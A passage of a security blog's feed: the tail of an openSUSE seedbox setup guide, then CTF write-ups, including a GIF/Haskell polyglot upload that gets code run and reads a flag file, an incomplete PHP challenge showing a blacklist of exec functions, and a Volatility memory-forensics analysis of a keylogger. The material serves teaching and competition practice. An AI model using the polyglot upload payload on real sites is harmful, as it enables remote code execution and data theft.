<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth</div></pre></td></tr></table></figure>
<ul>
<li>Protect the authentification file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 600 /etc/nginx/auth/seedbox_auth</div><div class="line"># chown nginx:nginx /etc/nginx/auth/*</div></pre></td></tr></table></figure>
<ul>
<li>Create ruTorrent config file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /srv/www/htdocs/rutorrent/conf/users/sdbox</div><div class="line"># vim /srv/www/htdocs/rutorrent/conf/users/sdbox/config.php</div></pre></td></tr></table></figure>
<ul>
<li>And add the content:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;</div><div class="line">$topDirectory = &apos;/home/sdbox&apos;;</div><div class="line">$scgi_port = 5001;</div><div class="line">$scgi_host = &apos;127.0.0.1&apos;;</div><div class="line">$XMLRPCMountPoint = &apos;/SDBOX&apos;;</div><div class="line">$tempDirectory = &apos;/srv/www/htdocs/rutorrent/tmp/&apos;;</div></pre></td></tr></table></figure>
<ul>
<li>Correct permissions:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown -R nginx:nginx /srv/www/htdocs/rutorrent</div><div class="line"># chmod 0777 /srv/www/htdocs/rutorrent/share/&#123;settings,torrents,users&#125;</div><div class="line"># systemctl restart nginx.service</div></pre></td></tr></table></figure>
<ul>
<li>Enable user lingering:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># loginctl enable-linger sdbox</div></pre></td></tr></table></figure>
<ul>
<li>To create a rTorrent service, create the file <code>/etc/systemd/system/rtorrent.service</code> containing:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[Unit]</div><div class="line">Description=rTorrent Daemon</div><div class="line">After=network.target</div><div class="line"></div><div class="line">[Service]</div><div class="line">Type=forking</div><div class="line">KillMode=none</div><div class="line">User=sdbox</div><div class="line">ExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrent</div><div class="line">ExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;</div><div class="line">WorkingDirectory=/home/sdbox/</div><div class="line">Restart=on-failure</div><div class="line"></div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div></pre></td></tr></table></figure>
<ul>
<li>Enable rtorrent at boot time and manually start it:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable rtorrent</div><div class="line"># systemctl start rtorrent</div></pre></td></tr></table></figure>
<ul>
<li>To allow web traffic trought the firewall, create this file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/httpd</div></pre></td></tr></table></figure>
<ul>
<li>And add this config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## Name: Web server</div><div class="line">## Description: opens ports for web servers in order to allow http and https traffic</div><div class="line"></div><div class="line"># space separated list of allowed TCP ports</div><div class="line">TCP=&quot;80 443&quot;</div></pre></td></tr></table></figure>
<ul>
<li>Now add the httpd config in the global settings:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2</div></pre></td></tr></table></figure>
<ul>
<li><p>And add <code>httpd</code> to <code>FW_CONFIGURATIONS_EXT</code>, for example <code>FW_CONFIGURATIONS_EXT=&quot;sshd httpd&quot;</code>.</p>
</li>
<li><p>Now restart the firewall:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Install rTorrent, git ang nginx:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/categories/linux/opensuse/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/tags/opensuse/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF - 150 - try - Web</title>
    <link href="http://rawsec.ml/en/C3CTF-33-150-try-web/"/>
    <id>http://rawsec.ml/en/C3CTF-33-150-try-web/</id>
    <published>2016-12-27T23:00:00.000Z</published>
    <updated>2016-12-30T10:25:27.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : 33C3 CTF</li>
<li><strong>Website</strong> : <a href="https://33c3ctf.ccc.ac/" target="_blank" rel="external">33c3ctf.ccc.ac</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/404" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>“I never try anything, I just do it!” <a href="http://78.46.224.73/" target="_blank" rel="external">Do</a></p>
<p>Flag is in /challenge/flag</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Home page looks like this (need to log in with just a pseudo):</p>
<p><img src="http://i.imgur.com/i5jBUHP.png" alt=""></p>
<p>On the profil page we can upload a profil picture (only gif):</p>
<p><img src="http://i.imgur.com/tPtblHp.png" alt=""></p>
<p>You can’t use easy trick to upload any files except gif:</p>
<ul>
<li>no double or triple extensions</li>
<li>no MIME type changing</li>
<li>not just the GIF file header <code>47 49 46 38 37 61</code> (GIF87a) +  GIF file trailer <code>00 3B</code> (;) – see <a href="http://www.garykessler.net/library/file_sigs.html" target="_blank" rel="external">file signatures</a></li>
</ul>
<p><img src="http://i.imgur.com/gB74rLj.png" alt=""></p>
<p>You have to upload the <del>nearly</del> full <a href="http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever" target="_blank" rel="external">skeleton</a> of the GIF picture.</p>
<p>But you can use a web proxy (like burpsuite) and append whatever you want at the end of the GIF.</p>
<p>As the website seems to execute Haskell algorithms, I tried to append some haskell code.</p>
<p>hello world (just to confirm haskell execution):</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = putStrLn <span class="string">"hello world"</span></div></pre></td></tr></table></figure>
<p>But just now we want to know where is uploaded our profil picture. It’s embedded in the heading and have a location like this <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>.</p>
<p><strong>Note</strong>: path is unpredictable and file is renamed.</p>
<p>What to do now? Try to execute it.</p>
<p>On the home page when you want to run some of the examples, you can see with a web proxy that the file to execute is up to you:</p>
<p><img src="http://i.imgur.com/OMaIqIH.png" alt=""></p>
<p>A legitimate run file is <code>run_file=fib.hs</code>.</p>
<p>If you try the download link you can see that this haskell script is hosted at <code>http://78.46.224.73/static/fib.hs</code>. Just remember that our picture is located at <code>http://78.46.224.73/static/33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code>. So what happen if we change it to <code>run_file=33c3_50fc0c1d-e04a-4942-9fc8-8921e4e83e6e/pic.gif</code> and if we append some haskell code at the end of the picture?</p>
<p>Unfortunatly this lead to an error: <code>lexical error at character &#39;\SOH&#39;</code> (with the tiniest GIF)</p>
<p><img src="http://i.imgur.com/iuLfarc.png" alt=""></p>
<p>or <code>lexical error (UTF-8 decoding error)</code> (with a real GIF)</p>
<p><img src="http://i.imgur.com/7JrAwbI.png" alt=""></p>
<p>So we conclude that the interpreter try to execute the bytecode of the GIF image. Unfortunatly we are not able to upload only haskell.</p>
<p>To limit error possibilities we tried to upload one of the tiniest GIF and replaced 0x01 (SOF) with 0x00 (null) but the website doesn’t allow that.</p>
<p>I think we have to upload a GIF file and neutralize GIF data. Then I read an excellent <a href="https://quadhead.de/storing-javascript-code-in-gif-images/" target="_blank" rel="external">article</a> talking about how to store javascript code in a GIF, so I tried to do the same with a haskell comment.</p>
<p>In haskell comments (<a href="https://wiki.haskell.org/Reference_card" target="_blank" rel="external">ref</a>) are like this:</p>
<ul>
<li><code>-- a single line comment</code></li>
<li><code>{- A multiline comment which can continue for many lines -}</code></li>
</ul>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>Hex</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>{</code></td>
<td>0x7b</td>
</tr>
<tr>
<td><code>}</code></td>
<td>0x7d</td>
</tr>
<tr>
<td><code>-</code></td>
<td>0x2d</td>
</tr>
</tbody>
</table>
<p>A legitimate minimalistic GIF would be:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ xxd handtinyblack.gif</div><div class="line">00000000: 4749 4638 3961 0100 0100 00ff 002c 0000  GIF89a.......,..</div><div class="line">00000010: 0000 0100 0100 0002 003b                 .........;</div></pre></td></tr></table></figure>
<p>Our malicious GIF with haskell comment and appended code would be:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln.gif</div><div class="line">00000000: 4749 4638 3961 7b2d 0100 0100 00ff 002c  GIF89a&#123;-.......,</div><div class="line">00000010: 0000 0000 0100 0100 0002 003b 2d7d 0a6d  ...........;-&#125;.m</div><div class="line">00000020: 6169 6e20 3d20 7075 7453 7472 4c6e 2022  ain = putStrLn &quot;</div><div class="line">00000030: 6865 6c6c 6f20 776f 726c 6422 0a         hello world&quot;.</div></pre></td></tr></table></figure>
<p>But again we have an error: <code>Parse error: naked expression at top level. Perhaps you intended to use TemplateHaskell</code></p>
<p><img src="http://i.imgur.com/1uVcIAd.png" alt=""></p>
<p>So we want to change <em>GIF89a</em> from an expression to a variable or a function, but the problem is that in haskell functions can’t begin with an uppercase letter, only data <a href="https://wiki.haskell.org/Constructor" target="_blank" rel="external">constructor</a> can. So we can’t begin with something like <code>GIF89a :: Integer</code> and if we begin with somethin else than <code>GIF89a</code> the image is not recognized as valid.</p>
<p>All the difficulty is about crafting a valid haskell code beginning with <code>GIF89a</code>.</p>
<p>I went to the official Haskell IRC and asked for this question, the trick is to start the file with a pattern matching and declare it later (<a href="https://wiki.haskell.org/Parsing_expressions_and_statements#Make_token_parser" target="_blank" rel="external">ref</a>).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ xxd vuln2.gif</div><div class="line">00000000: 4749 4638 3961 203d 2047 4946 3839 617b  GIF89a = GIF89a&#123;</div><div class="line">00000010: 2d01 0001 0000 ff00 2c00 0000 0001 0001  -.......,.......</div><div class="line">00000020: 0000 0200 3b2d 7d0a 6461 7461 2047 4946  ....;-&#125;.data GIF</div><div class="line">00000030: 3839 6120 3d20 4749 4638 3961 0a6d 6169  89a = GIF89a.mai</div><div class="line">00000040: 6e20 3d20 7075 7453 7472 4c6e 2022 6865  n = putStrLn &quot;he</div><div class="line">00000050: 6c6c 6f20 776f 726c 6422 0a              llo world&quot;.</div></pre></td></tr></table></figure>
<p>That works now! So now we will just switch the hello world program to somethinf reading the flag folder (we need native function because we can’t use <em>import</em> as it needs to be at the beginning of the file in the heading section):</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">main</span> = <span class="keyword">do</span>  </div><div class="line">    contents &lt;- readFile <span class="string">"/challenge/flag"</span></div><div class="line">    print $ contents</div></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/BwVowgX.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh can - Web</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2016-12-18T15:46:13.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p><a href="http://web04.grandprix.whitehatvn.com" target="_blank" rel="external">http://web04.grandprix.whitehatvn.com</a></p>
<p><a href="http://bakweb04.grandprix.whitehatvn.com:8118" target="_blank" rel="external">http://bakweb04.grandprix.whitehatvn.com:8118</a></p>
<p>Powered by People Security Academic - PSA</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR</strong>: Incomplete write-up.</p>
<p>Here is the home page:</p>
<p><img src="http://i.imgur.com/OZw8nP1.png" alt=""></p>
<p>Check the source code:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">What's your name? I just want to say hello :)</div><div class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- function hint() --&gt;</span></div></pre></td></tr></table></figure>
<p>So let’s try the hint function: <code>http://web04.grandprix.whitehatvn.com/?hint=</code>.</p>
<p><img src="http://i.imgur.com/kJVzdOH.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="keyword">array</span>(<span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"exec"</span>, <span class="string">"read"</span>, <span class="string">"open"</span>, <span class="string">"eval"</span>, <span class="string">"backtick"</span>, <span class="string">"`"</span>, <span class="string">"_"</span>);</div><div class="line"></div><div class="line"><span class="keyword">die</span>(<span class="string">"No no no hackers!!"</span>);</div></pre></td></tr></table></figure>
<h2 id="Submit"><a href="#Submit" class="headerlink" title="Submit"></a>Submit</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 300 - Banh it la gai - Forensics</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2016-12-18T15:46:13.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Submit: WhiteHat{SHA1(flag)}</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR</strong>: incomplete write-up.</p>
<ul>
<li>Download the zip.</li>
<li>Extract it.</li>
<li>We have a raw image.</li>
<li>Let’s see what we can do with Volatility:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/home/noraj/CTF/WhiteHat_GrandPrix/2016/For2/bkav5.raw)</div><div class="line">                      PAE type : PAE</div><div class="line">                           DTB : 0x334000L</div><div class="line">                          KDBG : 0x8054d2e0L</div><div class="line">          Number of Processors : 2</div><div class="line">     Image Type (Service Pack) : 3</div><div class="line">                KPCR for CPU 0 : 0xffdff000L</div><div class="line">                KPCR for CPU 1 : 0xfd24c000L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2016-11-06 16:47:44 UTC+0000</div><div class="line">     Image local date and time : 2016-11-06 23:47:44 +0700</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line">0x8107e020:System                                      4      0     60    228 1970-01-01 00:00:00 UTC+0000</div><div class="line">. 0xff596808:smss.exe                                 544      4      3     17 2016-11-06 16:44:22 UTC+0000</div><div class="line">.. 0xff4b4da0:winlogon.exe                            644    544     25    524 2016-11-06 16:44:23 UTC+0000</div><div class="line">... 0xff609998:services.exe                           744    644     13    246 2016-11-06 16:44:25 UTC+0000</div><div class="line">.... 0xff4a3d70:vmacthlp.exe                          928    744      1     25 2016-11-06 16:44:26 UTC+0000</div><div class="line">.... 0xff67a7e8:spoolsv.exe                          1600    744      6     54 2016-11-06 16:47:21 UTC+0000</div><div class="line">.... 0xff5cfda0:svchost.exe                           992    744     10    178 2016-11-06 16:44:27 UTC+0000</div><div class="line">.... 0xff583888:svchost.exe                          1348    744      6    119 2016-11-06 16:44:27 UTC+0000</div><div class="line">.... 0xff59a7b8:svchost.exe                           944    744      7    122 2016-11-06 16:44:26 UTC+0000</div><div class="line">.... 0x80fdec10:svchost.exe                           180    744      5     88 2016-11-06 16:44:45 UTC+0000</div><div class="line">.... 0xff481020:svchost.exe                          1876    744     15    194 2016-11-06 16:47:07 UTC+0000</div><div class="line">.... 0xff58c7b8:svchost.exe                          1244    744      5     59 2016-11-06 16:44:27 UTC+0000</div><div class="line">... 0xff5be460:lsass.exe                              760    644     25    332 2016-11-06 16:44:25 UTC+0000</div><div class="line">.. 0xff5974d8:csrss.exe                               616    544     10    265 2016-11-06 16:44:22 UTC+0000</div><div class="line">0x80ecf928:explorer.exe                             1740   1704     17    424 2016-11-06 16:44:32 UTC+0000</div><div class="line">. 0xff5bf138:DumpIt.exe                               308   1740      1     27 2016-11-06 16:47:42 UTC+0000</div><div class="line">. 0x80eb7690:rundll32.exe                            1884   1740      4     72 2016-11-06 16:44:37 UTC+0000</div><div class="line">. 0xff5b2888:keylog.exe                              2020   1740      2     35 2016-11-06 16:47:17 UTC+0000</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 procdump -p 2020 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Process(V) ImageBase  Name                 Result</div><div class="line">---------- ---------- -------------------- ------</div><div class="line">0xff5b2888 0x00400000 keylog.exe           OK: executable.2020.exe</div></pre></td></tr></table></figure>
<ul>
<li>See a supicious <code>keylog.exe</code> so we dumped it.</li>
<li>Upload it to <a href="https://www.virustotal.com/en/file/7b8b04c340e36d7f78d67cbcd22dd4299e579ebf40abfe79fd6c5d9e7240bc29/analysis/1482010139/" target="_blank" rel="external">Virustotal</a> and to <a href="https://www.hybrid-analysis.com/sample/7b8b04c340e36d7f78d67cbcd22dd4299e579ebf40abfe79fd6c5d9e7240bc29?environmentId=100" target="_blank" rel="external">Hybrid Analysis</a>.</li>
<li>Detection ratio: 4 / 56, a keylogger.</li>
<li>Just look for quick win:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ strings keylog.exe_executable.2020.exe</div><div class="line">[...]</div><div class="line"></div><div class="line">%c  -  %d</div><div class="line">c:/windows/keylog.log</div><div class="line">[WIN]</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure>
<ul>
<li>The malware is saving its collected informations in <code>c:/windows/keylog.log</code>.</li>
<li>Let’s find the file and dump it:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 filescan | grep -i &apos;keylog.log&apos;</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line"></div><div class="line">Offset(P)            #Ptr   #Hnd Access Name</div><div class="line">------------------ ------ ------ ------ ----</div><div class="line">0x00000000010410a0      1      0 RW-rw- \Device\HarddiskVolume1\WINDOWS\keylog.log</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000010410a0 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">DataSectionObject 0x010410a0   None   \Device\HarddiskVolume1\WINDOWS\keylog.log</div></pre></td></tr></table></figure>
<ul>
<li>But this is a non standard encoding:</li>
</ul>
